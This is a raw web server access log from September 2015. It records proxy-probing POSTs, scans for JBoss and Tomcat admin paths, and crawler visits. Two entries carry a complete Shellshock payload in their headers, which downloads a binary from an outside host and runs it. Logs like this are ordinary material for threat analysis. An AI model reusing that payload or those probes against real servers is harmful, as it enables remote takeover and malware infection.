222.186.30.211 - - [07/Sep/2015:20:03:52 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.30.211 - - [07/Sep/2015:20:04:08 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [07/Sep/2015:20:09:42 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [07/Sep/2015:20:15:06 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.31.145 - - [07/Sep/2015:20:15:15 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
46.172.71.251 - - [07/Sep/2015:20:18:42 +0000] "GET /rom-0 HTTP/1.1" 404 2341 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
222.186.30.211 - - [07/Sep/2015:20:31:24 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [07/Sep/2015:20:36:44 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.30.211 - - [07/Sep/2015:20:36:48 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.30.211 - - [07/Sep/2015:20:48:51 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.31.145 - - [07/Sep/2015:21:22:19 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
182.92.79.205 - - [07/Sep/2015:21:25:24 +0000] "GET / HTTP/1.1" 200 5362 "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://23.234.29.209:8806/cctv2 -O /tmp/China.Z-ersm >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-ersm >> /tmp/Run.sh;echo /tmp/China.Z-ersm >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22" "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://23.234.29.209:8806/cctv2 -O /tmp/China.Z-ersm >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-ersm >> /tmp/Run.sh;echo /tmp/China.Z-ersm >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22" "-"
222.186.31.145 - - [07/Sep/2015:21:45:18 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
59.56.69.195 - - [07/Sep/2015:21:46:53 +0000] "GET / HTTP/1.1" 403 0 "http://www.baidu.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" "-"
59.56.69.195 - - [07/Sep/2015:21:46:53 +0000] "GET / HTTP/1.1" 403 0 "http://www.baidu.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" "-"
59.56.69.195 - - [07/Sep/2015:21:46:53 +0000] "GET / HTTP/1.1" 403 0 "http://www.baidu.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" "-"
222.186.31.145 - - [07/Sep/2015:21:51:00 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.31.145 - - [07/Sep/2015:21:51:19 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
185.25.151.159 - - [07/Sep/2015:22:23:36 +0000] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 168 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0" "-"
222.186.129.5 - - [07/Sep/2015:22:31:21 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.31.145 - - [07/Sep/2015:22:48:27 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
182.92.79.205 - - [07/Sep/2015:23:16:46 +0000] "GET / HTTP/1.1" 200 5362 "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://23.234.29.209:8806/cctv2 -O /tmp/China.Z-zkib >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-zkib >> /tmp/Run.sh;echo /tmp/China.Z-zkib >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22" "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://23.234.29.209:8806/cctv2 -O /tmp/China.Z-zkib >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-zkib >> /tmp/Run.sh;echo /tmp/China.Z-zkib >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22" "-"
222.186.129.5 - - [07/Sep/2015:23:21:58 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.30.211 - - [07/Sep/2015:23:28:18 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.30.211 - - [07/Sep/2015:23:28:18 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [07/Sep/2015:23:55:43 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.30.211 - - [07/Sep/2015:23:56:05 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
111.20.248.74 - - [08/Sep/2015:00:38:53 +0000] "GET / HTTP/1.1" 403 0 "http://www.baidu.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" "-"
111.20.248.74 - - [08/Sep/2015:00:38:53 +0000] "GET / HTTP/1.1" 403 0 "http://www.baidu.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" "-"
111.20.248.74 - - [08/Sep/2015:00:38:53 +0000] "GET / HTTP/1.1" 403 0 "http://www.baidu.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" "-"
222.186.129.5 - - [08/Sep/2015:00:50:39 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [08/Sep/2015:00:51:00 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [08/Sep/2015:00:56:37 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
194.153.113.35 - - [08/Sep/2015:01:19:11 +0000] "GET /robots.txt HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; oBot/2.3.1; http://filterdb.iss.net/crawler/)" "-"
194.153.113.35 - - [08/Sep/2015:01:19:12 +0000] "GET / HTTP/1.1" 403 0 "-" "Mozilla/5.0 (compatible; oBot/2.3.1; http://filterdb.iss.net/crawler/)" "-"
194.153.113.35 - - [08/Sep/2015:01:19:14 +0000] "GET /robots.txt HTTP/1.1" 404 2341 "-" "Mozilla/5.0 (compatible; oBot/2.3.1; http://filterdb.iss.net/crawler/)" "-"
194.153.113.35 - - [08/Sep/2015:01:19:14 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; oBot/2.3.1; http://filterdb.iss.net/crawler/)" "-"
194.153.113.35 - - [08/Sep/2015:01:19:17 +0000] "GET / HTTP/1.1" 200 5362 "-" "Mozilla/5.0 (compatible; oBot/2.3.1; http://filterdb.iss.net/crawler/)" "-"
222.186.31.145 - - [08/Sep/2015:01:20:02 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
194.153.113.35 - - [08/Sep/2015:01:21:45 +0000] "GET /robots.txt HTTP/1.1" 404 2341 "-" "Mozilla/5.0 (compatible; oBot/2.3.1; +http://filterdb.iss.net/crawler/)" "-"
194.153.113.35 - - [08/Sep/2015:01:21:46 +0000] "GET / HTTP/1.1" 200 5362 "-" "Mozilla/5.0 (compatible; oBot/2.3.1; +http://filterdb.iss.net/crawler/)" "-"
194.153.113.35 - - [08/Sep/2015:01:21:47 +0000] "GET /img/zf2-logo.png HTTP/1.1" 404 2341 "-" "Mozilla/5.0 (compatible; oBot/2.3.1; +http://filterdb.iss.net/crawler/)" "-"
222.186.58.121 - - [08/Sep/2015:02:04:12 +0000] "GET http://www.baidu.com/ HTTP/1.1" 403 570 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.58.121 - - [08/Sep/2015:02:05:13 +0000] "GET http://www.baidu.com/ HTTP/1.1" 403 570 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [08/Sep/2015:02:09:42 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.31.145 - - [08/Sep/2015:02:09:57 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
154.87.1.102 - - [08/Sep/2015:02:14:41 +0000] "GET http://news.ydscan.net/zmap_s.php HTTP/1.1" 404 168 "-" "Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0" "-"
42.184.19.109 - - [08/Sep/2015:02:35:41 +0000] "GET http://www.xici.net/ HTTP/1.1" 403 570 "http://www.xici.net/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" "-"
222.186.31.145 - - [08/Sep/2015:02:51:40 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
121.42.0.31 - - [08/Sep/2015:03:06:51 +0000] "GET / HTTP/1.1" 403 0 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938576.p)" "-"
222.186.31.145 - - [08/Sep/2015:03:07:20 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.30.211 - - [08/Sep/2015:03:12:19 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.30.211 - - [08/Sep/2015:03:12:53 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.30.211 - - [08/Sep/2015:03:31:03 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
154.87.1.102 - - [08/Sep/2015:03:50:30 +0000] "GET http://news.ydscan.net/zmap_s.php HTTP/1.1" 404 168 "-" "Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0" "-"
222.186.30.211 - - [08/Sep/2015:03:56:48 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
123.125.71.34 - - [08/Sep/2015:04:09:22 +0000] "GET /robots.txt HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2" "-"
222.186.129.5 - - [08/Sep/2015:04:19:45 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
59.56.69.195 - - [08/Sep/2015:04:27:44 +0000] "GET / HTTP/1.1" 403 0 "http://www.baidu.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" "-"
59.56.69.195 - - [08/Sep/2015:04:27:44 +0000] "GET / HTTP/1.1" 403 0 "http://www.baidu.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" "-"
121.42.0.17 - - [08/Sep/2015:04:40:37 +0000] "PUT /webscan38502863.txt HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
121.42.0.17 - - [08/Sep/2015:04:40:47 +0000] "PUT /webscan38502863.txt HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
121.42.0.17 - - [08/Sep/2015:04:40:49 +0000] "GET /jmx-console/ HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
121.42.0.17 - - [08/Sep/2015:04:40:51 +0000] "GET /web-console/ HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
121.42.0.17 - - [08/Sep/2015:04:40:53 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
121.42.0.17 - - [08/Sep/2015:04:40:55 +0000] "GET /invoker/EJBInvokerServlet HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
121.42.0.17 - - [08/Sep/2015:04:40:57 +0000] "GET /status/ HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
121.42.0.17 - - [08/Sep/2015:04:40:59 +0000] "GET /server-status/ HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
121.42.0.17 - - [08/Sep/2015:04:41:13 +0000] "GET /web-console/ HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
121.42.0.17 - - [08/Sep/2015:04:41:15 +0000] "GET /jmx-console/ HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
121.42.0.17 - - [08/Sep/2015:04:41:17 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
121.42.0.17 - - [08/Sep/2015:04:41:19 +0000] "GET /invoker/EJBInvokerServlet HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
121.42.0.17 - - [08/Sep/2015:04:41:21 +0000] "GET /status HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
121.42.0.17 - - [08/Sep/2015:04:41:23 +0000] "GET /server-status HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
121.42.0.17 - 1 [08/Sep/2015:04:41:25 +0000] "GET /manager/html HTTP/1.1" 404 2341 "http://123.57.144.6/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.938954)" "-"
222.186.31.145 - - [08/Sep/2015:04:42:28 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [08/Sep/2015:04:57:26 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.30.211 - - [08/Sep/2015:05:02:52 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [08/Sep/2015:05:19:17 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.30.211 - - [08/Sep/2015:05:19:25 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
220.180.172.124 - - [08/Sep/2015:05:43:04 +0000] "GET http://mb.baidu.com/ HTTP/1.1" 403 570 "http://mb.baidu.com/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" "-"
222.186.30.211 - - [08/Sep/2015:05:53:39 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
121.42.210.61 - - [08/Sep/2015:06:10:00 +0000] "GET / HTTP/1.1" 200 5362 "-" "-" "-"
121.42.210.61 - - [08/Sep/2015:06:10:01 +0000] "" 400 0 "-" "-" "-"
222.186.129.5 - - [08/Sep/2015:06:38:07 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [08/Sep/2015:06:38:29 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
141.212.121.144 - - [08/Sep/2015:06:39:53 +0000] "GET / HTTP/1.1" 200 5362 "-" "Mozilla/5.0 zgrab/0.x" "-"
222.186.30.211 - - [08/Sep/2015:06:55:40 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.58.121 - - [08/Sep/2015:06:57:28 +0000] "GET http://www.baidu.com/ HTTP/1.1" 403 570 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.30.211 - - [08/Sep/2015:07:06:39 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.30.211 - - [08/Sep/2015:07:23:28 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [08/Sep/2015:07:35:31 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.31.145 - - [08/Sep/2015:07:35:31 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [08/Sep/2015:07:54:10 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
